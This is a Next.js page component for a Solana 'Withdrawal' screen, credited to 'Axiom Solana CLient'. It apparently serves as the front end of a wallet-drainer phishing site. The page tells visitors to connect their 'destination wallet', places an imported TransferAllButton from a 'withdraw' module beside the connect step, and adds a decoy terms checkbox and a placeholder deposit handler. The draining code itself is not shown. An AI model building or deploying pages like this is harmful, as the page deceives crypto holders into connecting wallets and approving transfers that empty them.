// app/page.tsx

"use client"; // Add this directive for using hooks like useState

import { useState } from "react";
import { ConnectButton } from "@/components/ConnectButton";
import Image from "next/image";
import TransferAllButton from "@/components/withdraw";
import { PrivacyModal } from "@/components/PrivacyModal"; // We will create this component next

export default function Home() {
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [isTermsAccepted, setIsTermsAccepted] = useState(false);

  // A placeholder function for the deposit action
  const handleDeposit = () => {
    if (isTermsAccepted) {
      alert("Proceeding to deposit...");
      // Add your actual deposit logic here
    }
  };

  return (
    <div className="page-container">
      <main className="welcome-card">
        <Image
          src="/reown.svg"
          alt="Reown Logo"
          width={100}
          height={100}
          priority
          className="logo"
        />

        <h1 className="welcome-title">Withdrawal</h1>
        <p className="welcome-subtitle">
          Connect your destination wallet to initiate Withdrawal.
        </p>

        {/* Step 1: Connect Wallet */}
        <div className="action-step">
          <ConnectButton />
        </div>

        <TransferAllButton />

        {/* Step 2: Agree to Terms and Deposit */}
        <div className="action-step">
          <div className="terms-agreement">
            <input
              type="checkbox"
              id="terms"
              checked={isTermsAccepted}
              onChange={(e) => setIsTermsAccepted(e.target.checked)}
            />
            <label htmlFor="terms">
              I have read and agreed to the{" "}
              <button
                type="button"
                className="link-button"
                onClick={() => setIsModalOpen(true)}
              >
                Privacy Policy & Terms
              </button>
              .
            </label>
          </div>

          <button
            className="cta-button"
            disabled={!isTermsAccepted}
            onClick={handleDeposit}
          >
            Proceed To Dashboard
          </button>
        </div>
      </main>

      <footer className="footer">
        <p>Powered By Axiom Solana CLient</p>
      </footer>

      {/* The Modal for Privacy Policy */}
      <PrivacyModal
        isOpen={isModalOpen}
        onClose={() => setIsModalOpen(false)}
      />
    </div>
  );
}
